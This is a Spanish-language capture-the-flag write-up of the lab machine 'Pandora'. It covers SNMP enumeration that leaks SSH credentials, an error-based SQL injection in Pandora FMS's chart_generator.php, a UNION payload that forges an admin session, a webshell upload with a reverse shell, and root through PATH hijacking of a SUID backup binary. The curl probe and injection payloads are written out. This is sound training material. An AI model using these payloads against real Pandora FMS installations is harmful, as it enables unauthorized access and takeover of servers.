---
title: "Pandora (Easy)"
date: 2026-01-14
author: "Isma"
tags: ["Linux", "SQL injection", "PATH hijacking"]
categories: ["Machine"]
slug: "pandora"
draft: false
---


## Resumen


Write-up de la máquina Pandora **(Easy)**. Pandora expone SSH (22/tcp) y una web (80/tcp) que no aporta mucho. La pista clave es revisar **UDP**, donde aparece **SNMP (161/udp)** con community string `public`. A partir de ahí conseguimos credenciales, pivoteamos a una instancia interna de **Pandora FMS**, explotamos una **SQLi** para secuestrar sesión de admin, subimos una webshell y finalmente escalamos a **root** mediante **PATH hijacking** en un binario SUID que invoca `tar` sin ruta absoluta.


![Imagen del post](/images/notion/2e8888fa-f353-8005-a888-ea6d255529dd.png)


## Enumeración


Enumeración TCP


```powershell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


La web en el puerto 80 solo mostraba una landing con formulario de contacto. No encontré una vía clara por ahí.


Enumeración UDP


Siguiendo la pista, enumeramos UDP y encontramos **SNMP**:


```powershell
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
```


Notas rápidas:

- SNMP suele usarse para monitorización y gestión remota.
- `public` es una community string típica y, si está expuesta, suele filtrar información sensible.

---


### Enumeración SNMP y acceso inicial


Usamos `snmpbulkwalk` para volcar información:


```powershell
snmpbulkwalk -c public -v2c 10.10.11.136
```


![Imagen del post](/images/notion/2e8888fa-f353-803f-8f7b-c15ab2e47c27.png)


En la salida aparecen credenciales:

- `daniel:HotelBabylon23`

Con estas credenciales entramos por SSH.


![Imagen del post](/images/notion/2e8888fa-f353-80c4-b98a-f2d6b615e3cd.png)


---


### Post-explotación (usuario) y pivote a servicio interno


Dentro, al revisar directorios, vemos que `user.txt` pertenece a `matt`:


```powershell
daniel@pandora:/home/matt$ ls
user.txt

daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
```


Necesitamos escalar o conseguir acceso como `matt`.


Durante la enumeración detectamos otra web interna. Hacemos **port forwarding** del puerto 80 remoto para acceder desde nuestra máquina.


Intentamos autenticarnos con las credenciales de `daniel` y no funciona.


![Imagen del post](/images/notion/2e8888fa-f353-809a-8776-eee07a29e27f.png)


En el footer se observa la versión del producto, lo que nos lleva a investigar vulnerabilidades conocidas.


---


### SQLi en Pandora FMS (chart_generator.php)

- [Pandora FMS 742: Critical Code Vulnerabilities Explained](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/)

Probamos el endpoint vulnerable para confirmar la inyección:


```powershell
curl -sG 
localhost:80/pandora_console/include/chart_generator.php
 --data-urlencode "session_id='" | head -1
```


Identificamos que es una **SQLi error-based** en una consulta del estilo:


```sql
SELECT * FROM tsessions_php WHERE `id_session` = '$session_id' LIMIT 1
```


![Imagen del post](/images/notion/2e8888fa-f353-80b4-9367-da3da557d777.png)


Determinar número de columnas


Probando `UNION SELECT`:

- Con 1 y 2 columnas falla.
- Con 3 columnas devuelve HTML correctamente.

Conclusión: la tabla devuelve **3 columnas**.


Dumpeo con sqlmap


Usamos `sqlmap` para extraer contenido de `tsessions_php` y encontramos una sesión de `matt`:


![Imagen del post](/images/notion/2e8888fa-f353-8069-bf6f-e5390d2999c4.png)


```javascript
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
```


Con esa sesión obtenemos acceso al panel como `matt`.


![Imagen del post](/images/notion/2e8888fa-f353-8073-b667-fc11ce39992d.png)


---


### Escalada a admin (secuestro de sesión)


Como `matt` no tenemos permisos de admin (no podemos subir ficheros). La solución es forzar una sesión de admin inyectando el contenido del campo `data`.


```plain text
session_id=' union select 1,2,'id_usuario|s:5:"admin";'-- -
```


Esto nos devuelve un `id_session` válido para **admin**.


![Imagen del post](/images/notion/2e8888fa-f353-80b1-9136-d933ed89e7c6.png)


---


### RCE: subida de webshell


Con sesión de admin subimos una `shell.php`. En el sistema aparece en:


```powershell
/var/www/pandora/pandora_console/images/shell.php
```


Accedemos a la webshell y lanzamos reverse shell (en mi caso funcionó mejor con la de pentestmonkey).


![Imagen del post](/images/notion/2e8888fa-f353-8077-a821-e5a38a46835f.png)


![Imagen del post](/images/notion/2e8888fa-f353-8098-87fd-e1cca529a643.png)


---


### Escalada a root (PATH hijacking en binario SUID)


Enumeramos binarios SUID:


```powershell
find / -perm -4000 2>/dev/null
```


Destaca `/usr/bin/pandora_backup`.


Al inspeccionar el binario se aprecia que invoca `tar` **sin ruta absoluta**. Esto permite **PATH hijacking**: si controlamos `PATH` y colocamos un ejecutable llamado `tar` antes que el real, el binario SUID ejecutará nuestro payload como root.


Ejecución


Desde la reverse shell no funcionó de forma fiable, pero por SSH sí (tras preparar claves). 


![Imagen del post](/images/notion/2e8888fa-f353-80db-837c-fbaf4797849e.png)


Una vez ajustado el `PATH` y ejecutado `pandora_backup`, obtenemos ejecución como **root**.


---

